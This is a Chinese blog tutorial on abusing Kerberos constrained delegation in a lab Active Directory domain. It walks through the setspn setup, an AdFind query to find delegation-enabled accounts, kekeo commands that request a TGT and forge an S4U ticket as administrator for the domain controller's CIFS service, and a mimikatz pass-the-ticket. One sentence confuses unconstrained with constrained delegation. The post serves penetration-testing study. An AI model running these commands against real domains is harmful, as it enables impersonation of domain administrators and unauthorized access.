---
title: "Kerberos协议之约束委派"
date: 2020-12-12T12:42:02+08:00
draft: false
tags:
- Kerberos
series:
- Windows协议
categories:
- 渗透测试
---


上文说到非约束委派，本文来说约束委派。
<!--more-->

# 概述
因为非约束委派的不安全性，约束委派应运而生。在2003之后微软引入了非约束委派，对Kerberos引入S4U，包含了两个子协议S4U2self、S4U2proxy。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)，S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/18d619ca-7f69-8093-cc99-490ea33720fe.png)

具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的**可转发的TGS**(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。


来看下实际的利用
# 利用
先配置约束委派环境。新建一个sql用户，并且加上spn表示其为服务用户。

```
setspn -A MSSQLSvc/DM.test.local:1433 sql
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/c06ef696-b59d-db86-23cf-e9d90778fef3.png)

加上spn之后委派的选项卡才会出现，因为只有服务账户和计算机账户才可以被委派。

在这里配置上dc的cifs可以被sql用户所委派。需要注意的是**使用任何身份验证协议**。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/22a2c77b-cbcc-a1ea-7213-41a77141c69c.png)

查找约束委派的用户

```
AdFind.exe -b dc=test,dc=local -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" -dn
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/c912960d-1b4f-fac5-7e6c-8d9f8b611739.png)

查找约束委派的主机

```
(&(samAccountType=805306368)(msds-allowedtodelegateto=*))
```

约束委派需要知道sql服务账户的密码或hash，此时在DM机器中使用kekeo申请tgt。

```
tgt::ask /user:sql /domain:test.local /password:test123!@#
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/7434440a-4b87-4cb2-6a3a-a2082cd77753.png)

使用该tgt通过s4u伪造`administrator@test.local`去访问dc的cifs服务。

```
tgs::s4u /tgt:TGT_sql@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi /user:administrator /service:cifs/dc.test.local
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ae9b48a5-09d1-902f-fe93-25033723971d.png)

生成了两个tgs

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b634e62c-53b8-4950-98dc-500bb1f15cd8.png)

通过mimikatz使用cifs的tgs票据进行ptt

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/c4b89d80-3e74-9e3a-162a-8b4f97deddd4.png)

实战中的利用需要知道配置了委派用户的密码或hash。

# 参考
1. https://xz.aliyun.com/t/7217
2. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a
3. https://daiker.gitbook.io/windows-protocol/kerberos/2


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**